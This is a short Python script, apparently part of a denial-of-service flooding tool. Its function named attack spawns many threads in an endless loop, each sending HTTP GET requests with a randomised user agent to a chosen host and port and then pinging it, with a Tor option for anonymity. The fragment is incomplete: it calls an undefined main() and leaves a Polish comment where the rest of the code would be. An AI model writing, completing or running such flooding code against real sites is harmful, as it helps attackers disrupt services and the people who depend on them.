import argparse
import requests
import threading
import time
import random
from ping3 import ping, verbose_ping

useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    # Add more user agents as needed
]

def attack(target, port, threads, use_tor):
    url = f"http://{target}:{port}/"

    def make_request():
        headers = {'User-Agent': random.choice(useragents)}
        try:
            response = requests.get(url, headers=headers, timeout=5)
            print(f"Connected to host... Status Code: {response.status_code}")
            
            # Ping the target after successful connection
            ping_time = ping(target)
            print(f"Ping to {target}: {ping_time} ms")
            
        except Exception as e:
            print(f"Error: {str(e)}")

    while True:
        for _ in range(threads):
            thread = threading.Thread(target=make_request)
            thread.start()

        # Sleep for 20 seconds without Tor or 40 seconds with Tor before checking the site
        sleep_time = 20 if not use_tor else 40
        time.sleep(sleep_time)

# ... reszta kodu bez zmian

if __name__ == "__main__":
    main()
